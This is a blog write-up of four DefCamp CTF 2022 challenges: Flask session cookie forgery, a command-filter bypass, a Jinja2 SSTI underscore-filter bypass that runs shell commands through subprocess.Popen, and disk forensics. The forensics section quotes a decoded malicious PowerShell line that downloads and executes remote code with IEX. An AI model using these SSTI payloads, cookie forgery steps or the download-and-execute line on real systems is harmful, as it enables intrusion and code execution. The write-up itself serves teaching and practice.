---
title: "CTF - DefCamp CTF 2022"
categories: [ctf]
date: 2022-02-05
comments: true
image: /images/kashmir.png
favicon: /images/favicon.ico
description: CTF - DefCamp CTF 2022
---

# DefCamp CTF 2022

<p align="center">
  <img src="/images/writeups/DefCamp2022/logo.png" width="50%"/>
</p>

Welcome! I've participated in this CTF with team [ISwearIGoogledIt](https://ctftime.org/team/109689) and got some challenges! 

---

Challenge index:

### Web

- [web-intro](#web-intro)
- [para-code](#para-code)


### Misc

- [wafer](#wafer)


### Forensic

- [Ok!](#ok)


<small><i><a href="https://github.com/kashmir54/md-toc">Table of contents generated with md-toc</a></i></small>

---

# Web

## web-intro

Description
Are you an admin?

Note: Access Denied is part of the challenge.


We visiting the website we can see an access denied, but we can see a session token:

```
eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgZ8uQ.9_nLfYI1kiWgx3paKGMLTMpzGus
```

<p align="center">
  <img src="/images/writeups/DefCamp2022/Web/1_0_jwt.png" width="80%"/>
</p>

We can see that it's not a valid token, also the payload is in the first part of the token, which is not normal. Anyway, we will set it to true in case that's the server behaviour:

```
eyJsb2dnZWRfaW4iOnRydWV9.YgZ8uQ.9_nLfYI1kiWgx3paKGMLTMpzGus
```

We can see the traceback of an error, one of them, claiming that it's a Flask server. Therefore, probably it's a flask session token. We can use flask-unsign for bruteforceing it and modify it:

```
kali@kali:~/Tools/Flask-Unsign$ flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgaaNw.gZ34BWHsWppIXACELQuy-k6ZDP4'
{'logged_in': False}
                                                                                                                                                                                                   
kali@kali:~/Tools/Flask-Unsign$ flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgaaNw.gZ34BWHsWppIXACELQuy-k6ZDP4'
[*] Session decodes to: {'logged_in': False}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2176): -----BEGIN PRIVATE KEY-----;r
[+] Found secret key after 14976 attemptsIM9ASGmdGPmk
'password'
                                                                                                                                                                                                   
kali@kali:~/Tools/Flask-Unsign$ flask-unsign --sign --cookie "{'logged_in': True}" --secret 'password'

eyJsb2dnZWRfaW4iOnRydWV9.YhalVQ.lSib12AskwKN5YV3IYrLXe5ic6I

```

Now we replace the token with the one we have generated and we obtained the flag:

``` CTF{66bf8ba5c3ee2bd230f5cc2de57c1f09f471de8833eae3ff7566da21eb141eb7} ```


## para-code

I do not think that this API needs any sort of security testing as it only executes and retrieves the output of ID and PS commands.

We can see the following code:

```php
<?php
require __DIR__ . '/flag.php';

if (!isset($_GET['start'])){
    show_source(__FILE__);
    exit;
} 

$blackList = array(
  'ss','sc','aa','od','pr','pw','pf','ps','pa','pd','pp','po','pc','pz','pq','pt','pu','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','ls','dd','nl','nk','df','wc', 'du'
);

$valid = true;
foreach($blackList as $blackItem)
{
    if(strpos($_GET['start'], $blackItem) !== false)
    {
         $valid = false;
         break;
    }
}

if(!$valid)
{
  show_source(__FILE__);
  exit;
}

// This will return output only for id and ps.

if (strlen($_GET['start']) < 5){

  echo shell_exec($_GET['start']);
} else {
  echo "Please enter a valid command";
}

if (False) {
  echo $flag;
}

?>
```

So we cannot bypass the 4 chars for the input, so I looked for 2 chars commands and fount [this page](https://www.davekb.com/browse_computer_tips:linux_two_letter_commands:txt).

We can bypass the filter with \\ or '', but we ran out of characters for the wildcard input:

```
l\\s
# flag.php, index.php
l''s
# flag.php, index.php
```

I tried different commands from the list, first I went for od (dump files in octal and other formats) but couldn't revert the result:

```
037474 064160 005160 022011 066146 063541 036440 021040
064164 071551 071551 064164 063145 060554 021147 005012
037077
```

Then, it turned out that was m4 command (macro processor). We can use it with the wildcard to dump all the files content, the flag included:

http://34.159.129.6:32136/?start=m4%20*

<p align="center">
  <img src="/images/writeups/DefCamp2022/Web/2_0_flag.png" width="80%"/>
</p>


``` 791b21ee6421993a8e25564227a816ee52e48edb437909cba7e1e80c0579b6be ```

---

# Misc

## wafer

Of course I included this protocol in my testing methodology and no vulnerabilities were found.

When visiting the website, we can see the following traceback error:

<p align="center">
  <img src="/images/writeups/DefCamp2022/Misc/2_0_ssti.png" width="80%"/>
</p>

We can see that it will be an SSTI (Server Side Template Injection) vulnerability. To send the data, we saw that the errors were printing 'HTTP' and 'GET' is undefinded, so used telnet to send the raw data and worked without any of the HTTP methods or syntax:

<p align="center">
  <img src="/images/writeups/DefCamp2022/Misc/2_0_see.png" width="80%"/>
</p>

Sending ```7*7``` returns 49 so we can confirm the SSTI:

<p align="center">
  <img src="/images/writeups/DefCamp2022/Misc/2_1_77.png" width="70%"/>
</p>

Now, the first thing is to understand the process within the server. We were getting errors with the following payloads:

```python
# Payload
7*'7'
'''
7777777
Connection closed by foreign host.
'''

# Payload 2
''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
'''
Traceback (most recent call last):
  File "/home/ctf/server.py", line 8, in <module>
    print(Template("{{"+inputval+"}}").render())
  File "/usr/local/lib/python3.9/dist-packages/jinja2/environment.py", line 1291, in render
    self.environment.handle_exception()
  File "/usr/local/lib/python3.9/dist-packages/jinja2/environment.py", line 925, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "<template>", line 1, in top-level template code
  File "/usr/local/lib/python3.9/dist-packages/jinja2/environment.py", line 474, in getattr
    return getattr(obj, attribute)
jinja2.exceptions.UndefinedError: 'str object' has no attribute 'class'
Connection closed by foreign host.
'''

# Payload 3
[].class.base.subclasses()
'''
Traceback (most recent call last):
  File "/home/ctf/server.py", line 8, in <module>
    print(Template("{{"+inputval+"}}").render())
  File "/usr/local/lib/python3.9/dist-packages/jinja2/environment.py", line 1291, in render
    self.environment.handle_exception()
  File "/usr/local/lib/python3.9/dist-packages/jinja2/environment.py", line 925, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "<template>", line 1, in top-level template code
  File "/usr/local/lib/python3.9/dist-packages/jinja2/environment.py", line 474, in getattr
    return getattr(obj, attribute)
jinja2.exceptions.UndefinedError: 'list object' has no attribute 'class'
Connection closed by foreign host.
'''

# Payload 4
len(''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read())
# Errors...
```

Then we realized that payloads were correct, but there must be some filtering undergoing in the server, the following payload confirmed the idea:

```python
# Payload 5 
'__name__'
'''
name
Connection closed by foreign host.
'''

# Payload 6
"name"
'''

Connection closed by foreign host.
'''

# Payload 7
"__name__"
'''

Connection closed by foreign host.
'''
```

So the main filter is the underscore (\_) as far as we know. Therefore, we used some [bypasses](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f) and we can see that it was successful. In this case, we used class and MRO (Method Resolution Order) to list the classes being inherited from:

```python
# Payload 8
''|attr('application')|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')
'''
(<class 'jinja2.runtime.Undefined'>, <class 'object'>)
Connection closed by foreign host.
'''
```

As paylaod worked, it was time to list methods from the object class and try to spot a method that might allow us to execute commands such as **os**, **sys** or **subprocess**. In this case, we can use the base from class to list the subclasses imported by this item.

```python
# Payload 9
()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()

'''
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, ... 
<class 'selectors.BaseSelector'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, ...
<class 're.Pattern'>, <class 'jinja2.loaders.BaseLoader'>, <class '__future__._Feature'>]
'''
```

We spotted **subprocess.Popen** at position 192, so next step is to craft the payload to call that method with the arguments. First locate the flag filename and then open it. 


```python
# Payload 10
()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(192)('ls')|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')
'''
flag.txt  server.py

Traceback (most recent call last):
  File "/home/ctf/server.py", line 8, in <module>
    print(Template("{{"+inputval+"}}").render())
  File "/usr/local/lib/python3.9/dist-packages/jinja2/environment.py", line 1291, in render
    self.environment.handle_exception()
  File "/usr/local/lib/python3.9/dist-packages/jinja2/environment.py", line 925, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "<template>", line 1, in top-level template code
  File "/usr/local/lib/python3.9/dist-packages/jinja2/utils.py", line 84, in from_obj
    if hasattr(obj, "jinja_pass_arg"):
jinja2.exceptions.UndefinedError: 'None' has no attribute 'decode'
Connection closed by foreign host.
'''
```

<p align="center">
  <img src="/images/writeups/DefCamp2022/Misc/2_2_ls.png" width="100%"/>
</p>

With **ls** we listthe directory and spotted **flag.txt** file. Let's dump its content:

```python
# Final payload
()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(192)('cat flag.txt',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')

'''
CTF{3497acdc5cdb795851f334a6c8f401a1e2504b4d05283b6b599e7b6dc42cc200}
'''
```

And the flag is printed:

<p align="center">
  <img src="/images/writeups/DefCamp2022/Misc/2_3_flag.png" width="70%"/>
</p>

``` CTF{3497acdc5cdb795851f334a6c8f401a1e2504b4d05283b6b599e7b6dc42cc200} ```

As curiosity, this was the code from the server:

```python
import subprocess
from jinja2 import Template
blacklist = ["config", "self", "_", '"']
inputval = input()
for x in blacklist:
    if x in blacklist:
        inputval = inputval.replace(x, "")
print(Template("{{"+inputval+"}}").render())
```


---


# Forensic

## Ok!

Our computer performance was altered by a malicious individual. We have managed to make a copy of the altered computer and we need immediately to obtain some answers regarding this file. Due to the stressful situation, one of our colleagues managed to write just a single word in his notebook:

Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook. Ook? Ook. Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook. Ook? Ook. Ook? Ook. Ook! Ook! Ook? Ook! Ook. Ook? Ook. Ook? Ook. Ook? Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.

Your input is needed on the following aspects and you should remember that wecracktheworlds is an important key in this process.

Files are available at the following links:

[Part 0](https://storage.googleapis.com/cyberedu-production/dctf22-ok-chall/unintended.zip.000)
[Part 1](https://storage.googleapis.com/cyberedu-production/dctf22-ok-chall/unintended.zip.001)
[Part 2](https://storage.googleapis.com/cyberedu-production/dctf22-ok-chall/unintended.zip.002)

Solution:

This challenge has different questions that will be answered on the fly.
First, we have to check out what are the resources provided. If you have never seen those Ook! things, that is an [esoteric programming language](https://esolangs.org/wiki/Main_Page) and there are many others like that, such as brainfuck or Rockstar, which seems like a rock song lyrics (but very bad).

We can use our best friend [decode.fr](https://www.dcode.fr/ook-language) to execute this Ook! program:

<p align="center">
  <img src="/images/writeups/DefCamp2022/Forensic/1_0_ook.png" width="80%"/>
</p>

So it seems like we will get a disk image and we have to use autopsy for this task. First I decompressed the three provided parts and obtained the **unintended.vmdk** which is a virtual machine disk format that I have seen on VMWare for example. 
I tried many options to import it into Autopsy, but as it is, I found no optimal way, neither the Unallocated Space or the Virtual Disk Image will recognize it, so I searched online for help and found that this file format is not compatible with Autopsy so we had to convert it to **raw** file format.

[Open VMDK with autopsy](https://andreafortuna.org/2016/09/08/open-a-vmware-disk-image-vmdk-with-autopsy-for-forensics-analisys/)
[Stackoverflow convert vmdk](https://stackoverflow.com/questions/454899/how-to-convert-flat-raw-disk-image-to-vmdk-for-virtualbox-or-vmplayer)
[Converting images](https://docs.openstack.org/image-guide/convert-images.html)

I installed qemu on my kali and converted the image:

```
qemu-img convert -f vmdk -O raw unintended.vmdk unintended.raw
```

Now import the image into Autopsy and start looking around.

### We know that the attacker attempted to download an infected image from one of his servers before launching the attack. Can you provide the file name? (Points: 50)

First we find some files called secrets, one with Powershell extension on the Desktop and other one with txt extension on the Documents folder:

<p align="center">
  <img src="/images/writeups/DefCamp2022/Forensic/3_3_secrets.png" width="80%"/>
</p>

secrets2.ps1.txt on Desktop:

```
EBNVG6LTORSW2LSOMV2C4V3FMJBWY2LFNZ2F2JDXMVREG3DJMVXHIIB5EBHGK5ZNJ5RGUZLDOQQFG6LTORSW2LSOMV2C4V3FMJBWY2LFNZ2DWW2TPFZXIZLNFZEU6LSTORZGKYLNLUSHG5DSMVQW2IB5EASHOZLCINWGSZLOOQXE64DFNZJGKYLEFATWQ5DUOBZTULZPGUXHI33QGR2G64BONZSXIL3QL4YTGNZSNBRTK2TWGEXGU4DHE4UTWW2TPFZXIZLNFZEU6LSTORZGKYLNKJSWCZDFOJOSI43SEA6SATTFO4WU6YTKMVRXIICTPFZXIZLNFZEU6LSTORZGKYLNKJSWCZDFOIQC2YLSM52W2ZLOORGGS43UEASHG5DSMVQW2O23ON2HE2LOM5OSI4TFON2WY5DTEA6SAJDTOIXFEZLBMRKG6RLOMQUCSO2JIVMCAJDSMVZXK3DUOM5SAZDFMZSW4ZDFOI======

Base32 ->

[System.Net.WebClient]$webClient = New-Object System.Net.WebClient;[System.IO.Stream]$stream = $webClient.OpenRead('https://5.top4top.net/p_1372hc5jv1.jpg');[System.IO.StreamReader]$sr = New-Object System.IO.StreamReader -argumentList $stream;[string]$results = $sr.ReadToEnd();IEX $results; defender
```

Secrets.txt on Documents:

```
E5EB9479E816D06CD53062B1EF017B185D9E47B087059484EEF344810E4B06A7
```

We can sse that the powershell script downloads a file called p_1372hc5jv1.jpg so that is our flag. Also, it was downloaded into the path /img_dest.raw/vol_vol3/Users/sunflower/Downloads/Malicious-Powershell-Samples-master/Malicious-Powershell-Samples-master/Sample 1

<p align="center">
  <img src="/images/writeups/DefCamp2022/Forensic/3_0_image.png" width="90%"/>
</p>

``` p_1372hc5jv1.jpg ```


### We know that the attacker used a password to unrar the malicious scripts downloaded from his server. Can you provide its value? (Points: 65)

We spotted the malware at the Downloads folder on the system as seen on the previous image:
/img_dest.raw/vol_vol3/Users/sunflower/Downloads/Malicious-Powershell-Samples-master/Malicious-Powershell-Samples-master/

We checked the README in the Downloads and as usual for Malware payloads, the password for decription was **infect** (instead of the usual _infected_)

```
# Malicious-Powershell-Samples

rarpass=infect
```

Or if you are going directly into the zip without reading the context you can use hashcat to crack it:

```
perl /usr/share/john/7z2john.pl Powershell\ Samples\ -\ Part1.7z > power.hash
hashcat -m 11600 power.hash /usr/share/wordlists/rockyou.txt 
```

<p align="center">
  <img src="/images/writeups/DefCamp2022/Forensic/3_1_hash.png" width="100%"/>
</p>


```infect```

That was all for this CTF! Thanks for reading!

